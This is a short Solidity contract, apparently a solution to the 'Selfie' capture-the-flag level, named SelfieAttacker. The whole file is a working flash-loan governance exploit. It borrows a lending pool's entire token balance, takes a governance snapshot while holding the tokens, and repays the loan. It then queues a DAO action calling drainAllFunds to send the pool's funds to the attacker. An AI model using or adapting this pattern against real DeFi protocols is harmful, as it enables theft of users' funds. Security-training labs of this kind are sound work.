pragma solidity ^0.8.0;

interface IERC20Snapshot {
  function snapshot() external returns (uint256);
  function balanceOf(address) external returns (uint256);
  function transfer(address, uint256) external;
}

interface IFlashPool {
  function flashLoan(uint256) external;
}

interface IDAO {
  function queueAction(address, bytes calldata, uint256) external returns (uint256);
  function executeAction(uint256) external;
}

contract SelfieAttacker {
  IERC20Snapshot private immutable snapshotToken;
  address private immutable flashPool;
  address private immutable dao;
  address private immutable owner;

  constructor(
    address _snapshotToken,
    address _flashPool,
    address _dao
  ) {
    owner = msg.sender;
    snapshotToken = IERC20Snapshot(_snapshotToken);
    flashPool = _flashPool;
    dao = _dao;
  }

  function attack() external {
    uint256 poolBalance = snapshotToken.balanceOf(flashPool);
    IFlashPool(flashPool).flashLoan(poolBalance);
    IDAO(dao).queueAction(
      flashPool,
      abi.encodeWithSignature(
        "drainAllFunds(address)",
        owner
      ),
      0
    );
  }

  function receiveTokens(address, uint256 amount) external {
    snapshotToken.snapshot();
    snapshotToken.transfer(flashPool, amount);
  }
}